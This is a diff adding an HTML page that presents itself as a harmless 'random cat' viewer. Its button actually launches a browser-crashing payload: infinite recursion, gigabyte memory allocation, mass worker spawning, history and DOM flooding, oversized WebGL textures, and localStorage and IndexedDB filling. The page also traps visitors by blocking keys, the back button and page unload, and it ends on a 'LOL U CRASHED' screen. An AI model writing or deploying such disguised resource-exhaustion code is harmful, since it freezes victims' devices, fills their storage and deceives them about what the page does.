@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>cats</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  font-family:'Inter',system-ui,sans-serif;
+  background:#0d0d12;
+  color:#eee;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.card{
+  background:#16161f;
+  border:1px solid #252532;
+  border-radius:18px;
+  padding:44px 40px;
+  width:min(340px,90vw);
+  text-align:center;
+  box-shadow:0 16px 40px rgba(0,0,0,.5);
+}
+h1{font-size:1.45rem;font-weight:700;letter-spacing:-.02em;margin-bottom:6px}
+.sub{color:#6b6b7b;font-size:.88rem;margin-bottom:28px}
+.btn{
+  background:linear-gradient(135deg,#ff5f5f,#e84545);
+  color:#fff;
+  border:none;
+  width:100%;
+  padding:15px;
+  font-size:1rem;
+  font-weight:600;
+  border-radius:12px;
+  cursor:pointer;
+  transition:transform .12s,filter .12s;
+}
+.btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
+.btn:active{transform:translateY(0)}
+#overlay{
+  position:fixed;inset:0;
+  background:#000;
+  color:#fff;
+  display:none;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:24px;
+  z-index:99999;
+}
+#overlay img{
+  max-width:280px;
+  width:70vw;
+  border-radius:8px;
+}
+#overlay span{
+  font-size:clamp(1.6rem,5.5vw,2.8rem);
+  font-weight:700;
+  letter-spacing:.04em;
+}
+</style>
+</head>
+<body>
+<div class="card" id="ui">
+  <h1>random cat</h1>
+  <p class="sub">one click · one cat</p>
+  <button class="btn" id="go">show me</button>
+</div>
+<div id="overlay">
+  <img src="https://i.pinimg.com/originals/65/45/45/654545a849ea191161e74190b2d720b4.gif" alt="">
+  <span>LOL U CRASHED</span>
+</div>
+
+<script>
+const go=document.getElementById('go');
+const overlay=document.getElementById('overlay');
+const ui=document.getElementById('ui');
+
+window.onbeforeunload=()=>' ';
+window.onunload=()=>{for(;;){}};
+history.pushState(null,null,location.href);
+window.onpopstate=()=>{history.pushState(null,null,location.href)};
+document.addEventListener('keydown',e=>{e.preventDefault();e.stopPropagation()},true);
+document.addEventListener('contextmenu',e=>e.preventDefault());
+setInterval(()=>{try{window.focus()}catch{}},100);
+
+go.onclick=()=>{
+  ui.style.display='none';
+  overlay.style.display='flex';
+
+  requestAnimationFrame(()=>{
+    requestAnimationFrame(()=>{
+      setTimeout(()=>{
+        (()=>{
+          // stack
+          const r=()=>r();try{r()}catch{}
+
+          // RAM
+          const b=[];
+          const eat=()=>{for(;;){
+            b.push(new ArrayBuffer(512<<20));
+            b.push(new Float64Array(64e6).fill(Math.random()));
+            b.push(new Uint8Array(256<<20));
+            b.push(new Int32Array(32e6).fill(0xffffffff));
+          }};
+          setTimeout(eat,0);
+
+          // workers
+          const src=`for(;;){new ArrayBuffer(1<<30);new Float64Array(4e7)}`;
+          const u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
+          for(let i=0;i<128;i++)setInterval(()=>{try{new Worker(u)}catch{}},0);
+
+          // history flood
+          const s='Z'.repeat(8e6);
+          setInterval(()=>history.pushState(0,0,s),0);
+
+          // DOM + filtros
+          setInterval(()=>{
+            for(let i=0;i<8e4;i++){
+              const e=document.createElement('div');
+              e.style.cssText=`position:fixed;width:${1e4*Math.random()}px;height:${1e4*Math.random()}px;left:${1e4*Math.random()}px;top:${1e4*Math.random()}px;background:hsl(${360*Math.random()},100%,50%);filter:blur(60px) contrast(400%) saturate(500%)`;
+              e.textContent=s;
+              document.body.appendChild(e);
+            }
+          },0);
+
+          // WebGL
+          for(let i=0;i<64;i++){
+            const c=document.createElement('canvas');
+            c.width=c.height=16384;
+            document.body.appendChild(c);
+            const g=c.getContext('webgl2')||c.getContext('webgl');
+            if(g)setInterval(()=>{
+              const t=g.createTexture();
+              g.bindTexture(g.TEXTURE_2D,t);
+              g.texImage2D(g.TEXTURE_2D,0,g.RGBA,16384,16384,0,g.RGBA,g.UNSIGNED_BYTE,null);
+            },0);
+          }
+
+          // iframes infinitos
+          setInterval(()=>{
+            for(let i=0;i<30;i++){
+              const f=document.createElement('iframe');
+              f.src='about:blank';
+              f.style.cssText='position:fixed;width:1px;height:1px;opacity:0';
+              document.body.appendChild(f);
+            }
+          },50);
+
+          // CSS variables thrash
+          setInterval(()=>{
+            document.documentElement.style.setProperty('--x',Math.random()*9999+'px');
+            document.documentElement.style.setProperty('--y',Math.random()*9999+'px');
+            document.documentElement.style.filter=`hue-rotate(${Math.random()*360}deg) blur(${Math.random()*20}px)`;
+          },0);
+
+          // storage
+          setInterval(()=>{
+            try{localStorage.setItem(Math.random()+'',s)}catch{}
+            try{sessionStorage.setItem(Math.random()+'',s)}catch{}
+          },0);
+
+          // IndexedDB
+          setInterval(()=>{
+            try{
+              const req=indexedDB.open('x'+Math.random(),1);
+              req.onupgradeneeded=e=>{
+                const db=e.target.result;
+                const store=db.createObjectStore('s');
+                for(let i=0;i<1e4;i++)store.put(s,i);
+              };
+            }catch{}
+          },0);
+
+          // fullscreen + pointer lock intentos
+          setInterval(()=>{
+            try{document.documentElement.requestFullscreen()}catch{}
+            try{document.body.requestPointerLock()}catch{}
+          },300);
+
+          // cpu
+          setInterval(()=>{
+            let x=0;for(let i=0;i<2e8;i++)x+=Math.sin(i)*Math.cos(i);
+          },0);
+        })();
+      },80);
+    });
+  });
+};
+</script>
+</body>
+</html>
